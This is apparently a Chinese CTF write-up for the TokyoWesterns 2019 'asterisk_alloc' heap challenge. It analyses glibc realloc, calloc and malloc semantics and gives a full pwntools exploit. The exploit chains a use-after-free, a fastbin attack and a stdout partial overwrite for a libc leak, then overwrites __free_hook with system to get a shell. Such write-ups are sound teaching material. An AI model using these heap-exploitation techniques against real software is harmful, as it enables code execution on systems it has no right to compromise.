---
title: 'TokyoWesterns2019:asterisk_alloc'
date: 2019-12-18 21:50:25
tags: heap
---
realloc save the world
<!--more-->
# prologue
之前的一题,队友当时解决的,感觉这题挺有趣的我就复现了一下。
[attachment][0]
因为是上周做的最近有点忙记不太清了..具体依照记忆来复述
# analysis

```s
[*] '/home/n132/Desktop/asterisk/asterisk'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```
保护全开主要的问题是`UAF`,比较好玩的是题目结合了`malloc`,`realloc`,`calloc`.在做题前得了解一下三者特性...

`malloc`: 平时了解的最多就不说了.

`calloc`: 之前简单认为是`malloc`+`memset`为0,现在粗略看了看[源码][1]发现其实是`_int_malloc`+`memset`不是`libc_malloc`也就是说不走`tcache`..还有一点是他其实也是有`hook`的但是他没有单独的`hook`用的是`__malloc_hook`

`realloc`: 应该算是本题的主角了可以说本题前面两个都是打杂的,这题也让我知道了原来`realloc`可以干这么多的事情,我在下一小节中介绍.

## realloc(ptr,size)

`https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3136`

具体的就不详细说明了源码是最好的老师`realloc`和`_int_realloc`看一遍基本就差不多了
 
从源码来看`realloc`主要会遇到以下情况(下面的说法是不严谨的主要为了便于理解)
1. size==0 相当于 _libc_free (返回值是0)
2. ptr=0   相当于 _libc_malloc 
3. chunk-expand 采用先看本chunk再看nextchunk都不行那就`alloc+copy+free`的策略
4. chunk-shrink 直接切分.

所以本题中唯一可以清空指针的地方也就是`realloc(ptr,0)`.
而`malloc`,`realloc`只能用一次.
然后我们在看本题是没有直接的泄漏点的要么`partial-write` 要么`IO leak` ···目前的经验来看大多情况下两者结合起来是最优解...

于是乎我们就要获得一个`unsorted bin`然后`partial write`指向`stdout`结构体之后改写之.

但是我们一共只有3个可用指针也就是说`malloc`/`calloc`只能用一次.
还有就是`calloc`不会从`tcache`上取`chunk`

但是要改写`stdout`我们至少需要2个chunk:
1. 1个是最终控制stdout区域的 (后文中命名为`1号`)
2. 第二个是拿掉`bins`链上最顶端的那个需要的(后文中命名为`2号`)

但是事实上我们还需要在这之前完成`partial-write`需要的`3号`
所以让我们现在分配一下任务.
首先是最灵活的`realloc`毫无疑问是是`3号`因为另外两者都只能用一次但是在泄漏后还有`get_shell`的重要任务所以只有最灵活的`realloc`可以担此大任
然后是`calloc`这个最辣鸡的...不可能是`1号`了因为如果他是`1号`会对内存`memset`为0那我们就没办法`partial_write` stduot了.所以`2号`是`calloc`··`1号`是`malloc`

此处还有个问题是`calloc`不会取`tcache`所以我们得做`fastbin atk`

所以我们的思路很清楚了
# solution
1. `realloc`乱七八糟一顿操作完成`fastbin atk`的布局
2. `calloc(0x68)`拿掉`fastbin[5]`顶端那个
3. `malloc(0x68)`改写`stdout` 造成泄漏
4. `realloc`乱七八糟一顿操作控制`__free_hook`
5. getshell

所以我们目前的关键就是**乱七八糟一顿操作**
oh.还有一点刚才忘记说了本题有个`scanf("%d")`可以直接召唤`malloc_consolidate`
那么我们怎么操作呢

经过我的尝试。我把上面**乱七八糟一顿操作**归结为如何造成`overlap`这个简单的问题.
过程我就不说了直接上结论如何使用`realloc` 完成任意地址写.
```python
add(0x88+0x20+0x20)
add(0x88+0x20)
add(0x88)
add(0)
add(0x18)
for x in range(7):
    free()
add(0)
add(0x88)
cmd("1"*0x420)
add(0x88+0x20,"A"*0x88+p64(0x21)+p64('somewhere...'))
```

主要就是通过`expand`来完成.

这样以来这题的思路的每一个环节都被打通所以我们可以就有了如下exp


# exp
概率为1/16
```python
from pwn import *
#context.log_level='debug'
context.arch='amd64'
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
one = [0x4f2c5,0x4f322,0x10a38c]
def cmd(c):
	p.sendlineafter(": ",str(c))
def malloc(size,c="A"):
	cmd(1)
	cmd(size)
	p.sendafter(": ",c)
def calloc(size,c='A'):
	cmd(2)
	cmd(size)
	p.sendafter(": ",c)
def realloc(size,c="A"):
	cmd(3)
	cmd(size)
	if size!=0:
		p.sendafter(": ",c)
	else:
		p.readuntil(": ")
def free(idx):
	if idx ==0:
		c="m"
	elif idx==1:
		c='c'
	else:
		c='r'
	cmd(4)
	cmd(c)
p=process('./pwn')
#p=remote("buuoj.cn",28744)
realloc(0x68)
for x in range(7):
	free(2)
realloc(0)
realloc(0x68)
realloc(0x88+0x20)

realloc(0x88)
for x in range(7):
	free(2)
realloc(0)
realloc(0x88)

realloc(0x68,"\x1d\x07")
#gdb.attach(p)
calloc(0x68)
malloc(0x68,'\x00'*0x33+p64(0x1802)+'\x00'*0x19)
p.read(0x80)
base=u64(p.read(8))-(0x7ffff7dd0700-0x7ffff79e4000)
libc.address=base
log.warning(hex(base))
realloc(0x68,p64(0x7ffff7dcfca0-0x7ffff79e4000+base)*2)

realloc(0)
realloc(0x98+0x88)
realloc(0x98)
realloc(0)
realloc(0x88)
free(2)
realloc(0)
realloc(0x98)
realloc(0x98+0x88,'\x00'*0x98+p64(0x91)+p64(libc.sym['__free_hook']-8))
realloc(0)
realloc(0x88)
realloc(0x68)
realloc(0)
realloc(0x88,"/bin/sh\x00"+p64(libc.sym['system']))
#gdb.attach(p)
free(2)

p.interactive()
# set stdou to leak
# free_hook
0x000555555756030
```




[0]: https://github.com/n132/WriteUps/tree/master/2019_TokyoWesterns
[1]: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3372